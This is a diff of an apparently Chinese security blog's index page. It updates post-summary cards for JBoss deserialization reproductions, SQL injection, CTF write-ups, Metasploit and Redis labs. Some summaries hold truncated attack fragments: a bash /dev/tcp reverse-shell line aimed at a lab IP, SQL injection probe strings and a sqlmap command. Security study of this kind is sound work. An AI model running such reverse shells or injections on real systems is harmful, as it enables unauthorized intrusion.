@@ -573,6 +573,107 @@ payload：${jndi:rmi://rf5cj8.dn
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
+                    <a href="/2021/11/13/jboss-5.x6.x-fan-xu-lie-hua-lou-dong-cve-2017-12149/">
+                        <div class="card-image">
+                            
+                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220316165228.png" class="responsive-img" alt="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）">
+                            
+                            <span class="card-title">JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）复现（反弹shell）主页如下
+
+直接访问页面http://192.168.60.134:8080/invoker/readonly
+发现报错信息
+
+编码反弹bash命
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-13
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    复现
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/jboss/">
+                            <span class="chip bg-color">jboss</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2021/11/11/jboss-4.x-jbossmq-jms-fan-xu-lie-hua-lou-dong-cve-2017-7504/">
+                        <div class="card-image">
+                            
+                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220316165215.png" class="responsive-img" alt="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）">
+                            
+                            <span class="card-title">JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）复现（反弹shell）打开主页如下所示
+
+将反弹bash命令加密
+#原始
+bash -i &gt;&amp; /dev/tcp/192.168.60.13
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-11-11
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    复现
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/jboss/">
+                            <span class="chip bg-color">jboss</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
                     <a href="/2021/10/11/fastjson-1.2.47-yuan-cheng-ming-ling-zhi-xing-lou-dong/">
                         <div class="card-image">
                             
@@ -776,6 +877,122 @@ rememberMe的AES加密泄露可影响任意版本的shiro，造成反序列化�
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
+                    <a href="/2021/09/11/ji-yi-ci-shen-tou-ce-shi/">
+                        <div class="card-image">
+                            
+                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220316165244.png" class="responsive-img" alt="记一次渗透测试">
+                            
+                            <span class="card-title">记一次渗透测试</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                实战|记一次渗透测试注入点探测站点：http://xxx.cn/?id=1
+简单测试发现存在注入
+?id=1 and 1=1--
+?id=1 and 1=2--
+
+sqlmap尝试
+sqlmap -u "http://xxx.xx/" --
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-11
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
+                                    渗透
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                            <span class="chip bg-color">sql注入</span>
+                        </a>
+                        
+                        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                            <span class="chip bg-color">内网渗透</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
+                    <a href="/2021/08/21/yi-xie-ctf-ti-mu/">
+                        <div class="card-image">
+                            
+                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220316165400.png" class="responsive-img" alt="一些CTF题目">
+                            
+                            <span class="card-title">一些CTF题目</span>
+                        </div>
+                    </a>
+
+                    <div class="card-content article-content">
+                        <div class="summary block-with-text">
+                            
+                                sql注入injection主页是这个样子
+
+
+判断注入类型    数字型
+
+ id=1 and 1=1#
+id=1 and 1=2#
+
+
+判断列数    两列
+
+id=1 order by 2#
+
+
+查询是否有显示位    union联合
+                            
+                        </div>
+                        <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
+                            </span>
+                            <span class="publish-author">
+                                
+                                <i class="fas fa-bookmark fa-fw icon-category"></i>
+                                
+                                <a href="/categories/ctf/" class="post-category">
+                                    ctf
+                                </a>
+                                
+                                
+                            </span>
+                        </div>
+                    </div>
+
+                    
+                    <div class="card-action article-tags">
+                        
+                        <a href="/tags/wp/">
+                            <span class="chip bg-color">wp</span>
+                        </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+            
+            <div class="article col s12 m6 l4" data-aos="zoom-in">
+                <div class="card">
                     <a href="/2021/07/10/buuctf-web-wp/">
                         <div class="card-image">
                             
@@ -818,82 +1035,16 @@ rememberMe的AES加密泄露可影响任意版本的shiro，造成反序列化�
                     
                     <div class="card-action article-tags">
                         
-                        <a href="/tags/buuctf/">
-                            <span class="chip bg-color">buuctf</span>
-                        </a>
-                        
                         <a href="/tags/wp/">
                             <span class="chip bg-color">wp</span>
+                        </a>
+                        
+                        <a href="/tags/buuctf/">
+                            <span class="chip bg-color">buuctf</span>
                         </a>
                         
                         <a href="/tags/web/">
                             <span class="chip bg-color">web</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2021/06/20/buuctf-misc-wp/">
-                        <div class="card-image">
-                            
-                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620102558.png" class="responsive-img" alt="buuctf-misc-wp">
-                            
-                            <span class="card-title">buuctf-misc-wp</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                签到
-知识点
-无
-
-过程点开即得到flag
-金三胖
-知识点
-利用工具stegsolve的Frame Browser可以查看gif图片的每一帧
-
-过程下载附件得到，aaa.gif
-下载工具stegsolve
-
-使用工具的FrameBrowse
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/ctf/" class="post-category">
-                                    ctf
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/buuctf/">
-                            <span class="chip bg-color">buuctf</span>
-                        </a>
-                        
-                        <a href="/tags/misc/">
-                            <span class="chip bg-color">misc</span>
-                        </a>
-                        
-                        <a href="/tags/wp/">
-                            <span class="chip bg-color">wp</span>
                         </a>
                         
                     </div>
@@ -951,6 +1102,10 @@ redis知识点
                     
                     <div class="card-action article-tags">
                         
+                        <a href="/tags/ctfhub/">
+                            <span class="chip bg-color">ctfhub</span>
+                        </a>
+                        
                         <a href="/tags/misc/">
                             <span class="chip bg-color">misc</span>
                         </a>
@@ -959,10 +1114,6 @@ redis知识点
                             <span class="chip bg-color">wp</span>
                         </a>
                         
-                        <a href="/tags/ctfhub/">
-                            <span class="chip bg-color">ctfhub</span>
-                        </a>
-                        
                     </div>
                     
                 </div>
@@ -970,36 +1121,43 @@ redis知识点
             
             <div class="article col s12 m6 l4" data-aos="zoom-in">
                 <div class="card">
-                    <a href="/2021/05/11/shi-yong-nmap-nessus-xin-xi-shou-ji/">
+                    <a href="/2021/06/20/buuctf-misc-wp/">
                         <div class="card-image">
                             
-                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220220094052.png" class="responsive-img" alt="使用nmap+nessus信息收集">
+                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210620102558.png" class="responsive-img" alt="buuctf-misc-wp">
                             
-                            <span class="card-title">使用nmap+nessus信息收集</span>
+                            <span class="card-title">buuctf-misc-wp</span>
                         </div>
                     </a>
 
                     <div class="card-content article-content">
                         <div class="summary block-with-text">
                             
-                                Nmap目标
-掌控信息，发现漏洞，便于渗透测试利用
+                                签到
+知识点
+无
 
-主机发现# 使用TCP扫描
-nmap -sP 192.168.140.0/24	#使用ICMP协议ping
-nmap -sP 192.168.140.0/24  	#使用ICMP协议pi
+过程点开即得到flag
+金三胖
+知识点
+利用工具stegsolve的Frame Browser可以查看gif图片的每一帧
+
+过程下载附件得到，aaa.gif
+下载工具stegsolve
+
+使用工具的FrameBrowse
                             
                         </div>
                         <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-11
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-20
                             </span>
                             <span class="publish-author">
                                 
                                 <i class="fas fa-bookmark fa-fw icon-category"></i>
                                 
-                                <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
-                                    渗透
+                                <a href="/categories/ctf/" class="post-category">
+                                    ctf
                                 </a>
                                 
                                 
@@ -1010,172 +1168,16 @@ nmap -sP 192.168.140.0/24  	#使用ICMP协议pi
                     
                     <div class="card-action article-tags">
                         
-                        <a href="/tags/nmap/">
-                            <span class="chip bg-color">nmap</span>
+                        <a href="/tags/misc/">
+                            <span class="chip bg-color">misc</span>
                         </a>
                         
-                        <a href="/tags/nessus/">
-                            <span class="chip bg-color">nessus</span>
+                        <a href="/tags/wp/">
+                            <span class="chip bg-color">wp</span>
                         </a>
                         
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2021/04/21/metasploit-zhu-ji-shen-tou/">
-                        <div class="card-image">
-                            
-                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220220094125.png" class="responsive-img" alt="metasploit主机渗透">
-                            
-                            <span class="card-title">metasploit主机渗透</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                Metasploit目标
-利用ms07-010漏洞，获得shell
-
-启动msfconsole
-
-
-搜索模块search ms17-010
-
-
-使用模块use exploit/windows/smb/ms17_010_eternalblue
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-21
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
-                                    渗透
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/metasploit/">
-                            <span class="chip bg-color">metasploit</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2021/04/21/redis-de-jian-dan-li-yong/">
-                        <div class="card-image">
-                            
-                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20220220100058.png" class="responsive-img" alt="redis的简单利用">
-                            
-                            <span class="card-title">redis的简单利用</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                redis简介Redis是一个开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库
-端口：6379
-环境
-kali =&gt;192.168.60.134
-cenos =&gt; 
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-21
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E5%A4%8D%E7%8E%B0/" class="post-category">
-                                    复现
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/redis/">
-                            <span class="chip bg-color">redis</span>
-                        </a>
-                        
-                    </div>
-                    
-                </div>
-            </div>
-            
-            <div class="article col s12 m6 l4" data-aos="zoom-in">
-                <div class="card">
-                    <a href="/2021/04/16/dc/">
-                        <div class="card-image">
-                            
-                            <img src="https://gitee.com/southerose/PictureBed/raw/master/img/20210417103737.png" class="responsive-img" alt="DC靶机系列">
-                            
-                            <span class="card-title">DC靶机系列</span>
-                        </div>
-                    </a>
-
-                    <div class="card-content article-content">
-                        <div class="summary block-with-text">
-                            
-                                收获DC1
-回顾了metasploit的一些用法
-利用已知cms的exp来getshell
-hashcat爆破用法
-find提权
-
-DC2
-cewl根据网页内容生成字典
-wpscan结合cewl跑账号和密码
-用metasploit的模块来s
-                            
-                        </div>
-                        <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-16
-                            </span>
-                            <span class="publish-author">
-                                
-                                <i class="fas fa-bookmark fa-fw icon-category"></i>
-                                
-                                <a href="/categories/%E6%B8%97%E9%80%8F/" class="post-category">
-                                    渗透
-                                </a>
-                                
-                                
-                            </span>
-                        </div>
-                    </div>
-
-                    
-                    <div class="card-action article-tags">
-                        
-                        <a href="/tags/%E9%9D%B6%E6%9C%BA/">
-                            <span class="chip bg-color">靶机</span>
+                        <a href="/tags/buuctf/">
+                            <span class="chip bg-color">buuctf</span>
                         </a>
                         
                     </div>
@@ -1284,7 +1286,7 @@ wpscan结合cewl跑账号和密码
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">23.2k</span>&nbsp;字
+                class="white-color">31.8k</span>&nbsp;字
             
             
             
